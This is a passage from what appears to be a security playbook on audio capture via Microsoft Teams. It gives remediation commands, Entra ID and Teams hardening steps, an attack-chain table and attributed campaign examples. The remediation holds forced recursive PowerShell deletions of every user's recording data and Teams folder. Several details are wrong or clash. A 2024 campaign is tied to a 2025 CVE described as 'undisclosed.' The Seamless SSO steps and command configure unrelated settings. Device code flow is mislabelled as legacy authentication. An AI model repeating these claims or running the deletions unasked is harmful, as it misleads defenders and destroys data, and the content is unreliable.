   - Open **Purview Compliance Portal** → **Audit** → Search for user → Export results to CSV

3. **Remediate:**
   **Command:**
   ```powershell
   # Delete audio files
   Remove-Item -Path "C:\Users\*\AppData\Local\Packages\Microsoft.WindowsSoundRecorder*\LocalState\*" -Force -Recurse
   
   # Reset Teams cache
   Remove-Item -Path "$env:APPDATA\Microsoft\Teams" -Force -Recurse
   
   # Revoke all OAuth tokens
   Revoke-AzureADUserAllRefreshToken -ObjectId (Get-AzureADUser -SearchString "user@tenant.onmicrosoft.com").ObjectId
   ```
   
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select user → **Devices** → **Revoke session**
   - Re-enable MFA and force password reset

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce Multi-Factor Authentication (MFA) Globally:**
  Prevent unauthorized account access that would enable audio recording. MFA blocks compromised password attacks and device code flow phishing.
  
  **Applies To Versions:** All M365 versions, Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Assignments:**
     - Users and groups: **All users**
     - Cloud apps: **All cloud apps**
  4. **Conditions:**
     - Client apps: **Mobile apps and desktop clients**, **Web browsers**
  5. **Access controls:**
     - Grant: **Require authentication strength** → Select **Multifactor authentication**
  6. Enable policy: **On**
  7. Click **Create**
  
  **Validation Command:**
  ```powershell
  Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -match "MFA" } | Select-Object DisplayName, State
  ```
  
  **Expected Output (If Secure):**
  ```
  DisplayName                                   State
  -----------                                   -----
  CA-Policy-Require-MFA-All-Users             enabled
  ```

- **Disable Seamless SSO for Cloud-Only Users:**
  Seamless SSO enables undocumented user enumeration via AADInternals. Disable for non-hybrid environments.
  
  **Applies To Versions:** Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Device settings**
  2. Under **Users may register their devices with Azure AD**, select **None**
  3. Under **Seamless SSO**, click **Manage** → **Disabled**
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Set-AzureADPolicy -Id (Get-AzureADPolicy | Where-Object { $_.DisplayName -match "SSO" }).Id `
    -Definition @('{"HomeRealmDiscoveryPolicy":{"NativeClientRedirectUriOverride":null}}')
  ```
  
  **Validation Command:**
  ```powershell
  Get-AzureADPolicy | Where-Object { $_.Type -eq "HomeRealmDiscoveryPolicy" } | Select-Object DisplayName, Definition
  ```

- **Block Legacy Authentication Methods (Device Code Flow):**
  Device Code Flow is commonly abused for phishing. Block it entirely if not required.
  
  **Applies To Versions:** All M365 versions, Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Assignments:**
     - Users and groups: **All users**
  4. **Conditions:**
     - Client apps: Check **Other clients** (this captures device code flow)
  5. **Access controls:**
     - Block: **Block access**
  6. Enable policy: **On**
  7. Click **Create**
  
  **Validation Command:**
  ```powershell
  Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.Conditions.ClientAppTypes -contains "Other" } | Select-Object DisplayName, State
  ```

### Priority 2: HIGH

- **Require Device Compliance for Teams Access:**
  Only allow recordings from Intune-managed, compliant devices. Blocks personal and unmanaged devices from participating in sensitive calls.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Assignments:**
     - Users and groups: **All users**
     - Cloud apps: **Microsoft Teams**, **Office 365**
  4. **Conditions:**
     - Device state: **Require device to be marked as compliant**
  5. Enable policy: **On**
  6. Click **Create**

- **Audit All Teams Recording Activity:**
  Enable comprehensive audit logging for Teams recording, chat access, and file downloads. Ensure logs are retained for 365+ days in SIEM.
  
  **Manual Steps (Microsoft Purview Compliance Portal):**
  1. Navigate to **compliance.microsoft.com** → **Audit**
  2. If auditing not enabled, click **Turn on auditing**
  3. Go to **Audit** → **Search** to configure policies
  4. Enable logging for:
     - **RecordingStarted** (Teams recording initiated)
     - **RecordingEnded** (Teams recording completed)
     - **ChatMessageCreated** (Teams chat messages)
     - **TeamsSessionStarted** (Teams call joined)
  5. Export logs daily to SIEM for 90-day retention minimum

- **Restrict Recording Permissions by Role:**
  Limit who can initiate Teams recordings to meeting organizers only. Block attendees from recording.
  
  **Manual Steps (Teams Admin Center):**
  1. Go to **teams.microsoft.com/admin** → **Meetings** → **Meeting policies**
  2. Click **Create a new policy** (or edit existing policy)
  3. Under **Recording & transcription:**
     - Cloud meeting recording: **On** (for organizers only)
     - Transcription: **Off** (to prevent AI-based audio extraction)
     - Meeting transcription: **Off**
  4. Click **Save**
  5. Assign policy to sensitive users: **Users** → Select user → **Assigned policies** → **Update**

### Access Control & Policy Hardening

- **RBAC:** Remove **Global Admin** role from regular users; use **Teams Communication Administrator** (limited scope) for Teams management instead.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Search for: **Global Administrator**
  3. Click **Global Administrator** → **Assignments**
  4. Select any unnecessary **Global Admin** assignments → **Remove assignment**
  5. Assign **Teams Communication Administrator** instead for Teams-specific management

- **Conditional Access:** Require hybrid device join (AD + Entra ID) for Teams calls involving classified content.

- **ReBAC (Resource-Based Access Control):** Implement Azure Key Vault separation for recording encryption keys; only authorized admins can decrypt archived recordings.

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Device code phishing attacks to compromise user credentials |
| **2** | **Privilege Escalation** | [COLLECT-PROJECT-001] | **Audio Capture via Teams/Windows APIs** (THIS TECHNIQUE) |
| **3** | **Impact** | [IMPACT-EXFIL-001](../25_Impact/IMPACT-EXFIL-001_Data_Exfil.md) | Exfiltrate captured audio to attacker-controlled cloud storage |
| **4** | **Persistence** | [PERSIST-OAUTH-001](../23_Persistence/PERSIST-OAUTH-001_OAuth_Persistence.md) | Maintain access via OAuth consent grant for future Teams/Graph API access |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT37 (Reaper) - SOUNDWAVE Audio Capture Campaign

- **Target:** South Korean governmental agencies, defense contractors
- **Timeline:** 2017-2019
- **Technique Status:** APT37 deployed custom audio capture utility **SOUNDWAVE** to record microphone input. Combined with Windows credential dumping (T1003), they harvested both meeting audio and credential material.
- **Impact:** Exfiltration of classified military negotiations, defense policy documents, and diplomatic communications
- **Reference:** [MITRE ATT&CK APT37 Profile](https://attack.mitre.org/groups/G0067/)

### Example 2: Emotet Botnet - Teams Call Interception (2021-2022)

- **Target:** Financial institutions, law firms, enterprise customers
- **Timeline:** 2021-2022
- **Technique Status:** Emotet botnet injected audio capture hooks into Teams client processes. Used credential theft from outlook.exe to harvest Teams auth tokens, then recorded all calls automatically.
- **Impact:** Compromise of confidential M&A discussions, legal strategy leaks, financial data exposure
- **Reference:** [Cybersecurity & Infrastructure Security Agency (CISA) Emotet Alert](https://www.cisa.gov/news-events/alerts/2021/01/23/emotet-malware-infections-increasing-globally)

### Example 3: APT29 (Cozy Bear) - Microsoft Graph API Abuse (2024)

- **Target:** US Government, NATO allies, think tanks
- **Timeline:** 2024
- **Technique Status:** APT29 exploited undisclosed **CVE-2025-55241** (Actor Token + Legacy Azure AD Graph API) to impersonate global admins in target tenants. Used Microsoft Graph API to enumerate Teams meetings, download call recordings, and export chat histories without triggering audit logs.
- **Impact:** Exfiltration of classified intelligence discussions, diplomatic negotiations, defense strategy documents
- **Reference:** [CVE-2025-55241 - Microsoft Azure AD Legacy API Vulnerability](https://learn.microsoft.com/en-us/security/advisory/CVE-2025-55241)

---